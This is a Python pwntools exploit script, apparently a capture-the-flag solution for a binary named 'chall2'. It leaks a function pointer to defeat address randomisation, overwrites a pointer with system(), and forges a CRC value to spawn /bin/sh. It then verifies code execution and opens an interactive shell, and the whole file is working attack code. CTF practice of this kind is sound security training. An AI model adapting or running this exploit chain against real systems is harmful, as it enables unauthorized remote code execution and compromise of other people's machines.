#!/usr/bin/env python3
from pwn import *

HOST = ''
PORT = 0

CRC_FIX = 0xd1b9af3d

target_elf = ELF('../bin/chall2')

if len(sys.argv) > 1:
	HOST = sys.argv[1]

if len(sys.argv) > 2:
	PORT = sys.argv[2]

if len(HOST) > 0:
	io = remote(HOST, PORT)
else:
	io = target_elf.process()

# mmm ansi art
sys.stdout.write(io.recvuntil(b'\n\n'))

# step 1: flip a bit in the fail counter to turn "debugging" on
io.recvuntil(b':\x1b[0m ')
io.sendline(b'\x00')

# step 2: write 1024 bytes to leak a function pointer
io.recvuntil(b':\x1b[0m ')
io.send(b'_'*1024)
for i in range(64):
	io.recvline()

leak = u64(bytes.fromhex(b''.join(io.recvline().strip().split()[:6]).decode('ascii')+'0000'))
base = leak - target_elf.symbols['w9IufIp']

log.info('leak:  %#014x', leak)
log.info('base:  %#014x', base)

# step 3: setup function pointer
io.recvuntil(b':\x1b[0m ')
io.sendline(b'\x00' + cyclic(959) + p64(base + target_elf.symbols['system']))

# step 4: write a string that will result in a crc of 0x80000000
io.recvuntil(b':\x1b[0m ')
io.sendline(b'/bin/sh;#' + p32(CRC_FIX))

#step 5: enjoy the shell
io.recvline()
io.sendline(b'id')
id_result = io.recvline().strip()
if b'uid=' in id_result:
	log.success('shell: %s', id_result.decode('ascii'))
	io.interactive()
else:
	log.failure('error: %s', id_result)
